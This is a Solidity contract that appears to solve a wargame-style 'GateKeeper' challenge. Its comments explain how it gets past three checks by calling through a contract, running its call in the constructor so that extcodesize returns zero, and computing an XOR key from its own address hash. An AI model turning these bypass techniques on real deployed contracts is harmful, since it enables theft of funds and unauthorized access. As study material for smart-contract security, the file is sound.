//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Attack{

//the first require() will return true because the fct inside 
//GateKeeper contract is called by this contract, not the EOA address

address internal target;

//the second requirement is satisfied if the size of code at the caller() address is 0
//the extcodesize() is used to make sure the caller is a wallet, not a contract
//this can be bypassed by executing the caller logic in the constructor 
//because at the time the constructor executes the EVM has not yet stored the size of code of caller
//so extcodesize() will return 0

constructor(address a) payable{
    target = a;
    bytes8 key = getGateKey();
    (bool success, ) = target.call(abi.encodeWithSignature("enter(bytes8)", key));
    require(success, "fail");
}

//for the 3rd require() a special key has to be generated
//the condition will be satisfied by a 8 byte key that once 
//XORed with the first 8 bytes of the hashed msg.sender address will return the max value of uint64 (2**64-1)

//I generated the key with the following function: 
function getGateKey() public view returns(bytes8 key){
    //1. get the first 8 bytes of the current address hash
    bytes8 first8 = bytes8(keccak256(abi.encodePacked(address(this))));

    //2. convert the 8 bytes into a 64 bit uint and XOR the result with the max value of uint64
    //this will work because if a^b == x => b == a^x
    //so the key can be computed by XOR-ing the other 2 elements
    uint64 uintKey = uint64(first8) ^ type(uint64).max;

    //3.return the key converted to bytes
    key = bytes8(uintKey);
    
}

}
